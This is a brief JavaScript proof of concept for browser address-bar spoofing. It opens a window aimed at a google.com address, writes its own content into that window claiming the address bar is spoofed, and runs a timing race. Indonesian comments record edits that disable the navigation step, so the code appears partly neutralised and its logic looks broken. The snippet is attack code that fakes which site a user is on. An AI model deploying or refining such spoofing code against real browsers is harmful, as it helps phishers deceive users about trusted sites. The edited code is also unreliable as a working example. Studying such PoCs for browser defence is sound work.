<script>

let windowSpoof;

function race() {
  try {
    windowSpoof.location.href !== 'https://www.google.com/csi';
  }
  catch (e) {
    // ✅ KOMENTAR baris ini agar tidak navigate:
    // windowSpoof.location.href='https://www.google.com/csi';
    
    // ✅ TAMBAHAN: Stop di sini saja
    return; // ← TAMBAHKAN INI
  }
}

function startSpoof() {
  windowSpoof = window.open("https://www.google.com:82","x");
  windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
  
  // ✅ TAMBAHAN: 3 baris ini
  windowSpoof.document.close();
  windowSpoof.stop();
  
  setInterval('race()', 0);
}

</script>
